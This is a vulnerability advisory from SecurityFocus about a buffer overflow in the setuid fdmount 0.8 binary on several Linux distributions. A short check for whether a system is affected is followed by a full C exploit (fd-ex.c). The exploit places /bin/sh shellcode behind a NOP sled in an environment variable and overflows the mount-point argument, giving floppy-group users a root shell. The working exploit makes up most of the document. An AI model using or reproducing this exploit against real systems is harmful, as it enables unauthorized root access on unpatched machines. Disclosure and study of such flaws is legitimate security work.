source: http://www.securityfocus.com/bid/1239/info

A buffer overflow exists in the 0.8 version of the fdmount program, distributed with a number of popular versions of Linux. By supplying a large, well crafted buffer containing machine executable code in place of the mount point, it is possible for users in the 'floppy' group to execute arbitrary commands as root.

This vulnerability exists in versions of S.u.S.E., 4.0 and later, as well as Mandrake Linux 7.0. TurboLinux 6.0 and earlier ships with fdmount suid root, but users are not automatically added to the 'floppy' group. This list is by no means meant to be complete; other Linux distributions may be affected. To check if you're affected, check for the presence of the setuid bit on the binary. If it is present, and the binary is either world executable, or group 'floppy' executable, you are affected and should take action immediately. 

/*
 * fdmount 0.8 buffer-overflow exploit (fd-ex.c)
 * (C) 2000 Paulo Ribeiro <prrar@nitnet.com.br>
 *
 * Systems tested: Slackware Linux 7.0
 * 
 * Remember: you have to be a member of floppy group to exploit it!
 */ 

#include <stdlib.h>

#define DEFAULT_OFFSET                    0   
#define DEFAULT_BUFFER_SIZE             180
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc > 1) bsize   = atoi(argv[1]);
  if (argc > 2) offset  = atoi(argv[2]);
  if (argc > 3) eggsize = atoi(argv[3]);
  
  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n"); 
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_esp() - offset;
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr; 

  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;
 
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i]; 
   
  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  memcpy(egg,"EGG=",4);
  putenv(egg);
  memcpy(buff,"RET=",4);                  
  putenv(buff);
  system("/usr/bin/fdmount fd0 $RET");     
}

/* fd-ex.c: EOF */